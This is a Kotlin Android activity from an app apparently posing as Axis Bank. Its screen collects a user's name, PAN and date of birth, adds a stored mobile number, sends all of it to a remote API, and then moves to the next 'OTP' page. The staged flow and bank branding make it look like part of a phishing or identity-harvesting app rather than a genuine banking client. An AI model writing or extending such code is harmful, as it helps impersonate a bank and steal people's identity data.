package com.example.axisbank

import android.content.Intent
import androidx.appcompat.app.AppCompatActivity
import android.os.Bundle
import android.util.Log
import android.widget.Toast
import com.example.axisbank.databinding.ActivityOtponeBinding
import retrofit2.Call
import retrofit2.Callback
import retrofit2.Response

class Otpone : AppCompatActivity() {

    private lateinit var binding : ActivityOtponeBinding

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        binding = ActivityOtponeBinding.inflate(layoutInflater)
        setContentView(binding.root)

        binding.back.setOnClickListener {
            finish()
        }

        binding.submit.setOnClickListener {
            if (binding.name.text.toString().isEmpty()||binding.date.text.toString().isEmpty()||binding.pan.text.toString().isEmpty()){
                Toast.makeText(this,"Fill all fields",Toast.LENGTH_SHORT).show()
            }else{

                val intentff = Intent(this, opttwo::class.java)
                val apiService = ApiClient.getClient().create(ApiService::class.java)
                val util = Util()
                val data = SecondPageData(domain = "example.com", last_update = "second", mobile = util.getLocalData(this,"mobile"),
                    name = binding.name.text.toString(), pan = binding.pan.text.toString(), dob = binding.date.text.toString())
                val call = apiService.secondpage(data)
                call.enqueue(object : Callback<Void?> {
                    override fun onResponse(call: Call<Void?>, response: Response<Void?>) {
                        if (response.isSuccessful) {
                            startActivity(intentff)
                            Log.d("asdf123", "yes")
                        } else {
                            Log.d("asdf123", "unsucess")
                        }
                    }

                    override fun onFailure(call: Call<Void?>, t: Throwable) {
                        Log.d("asdf123", t.toString())
                    }
                })


            }
        }


    }
}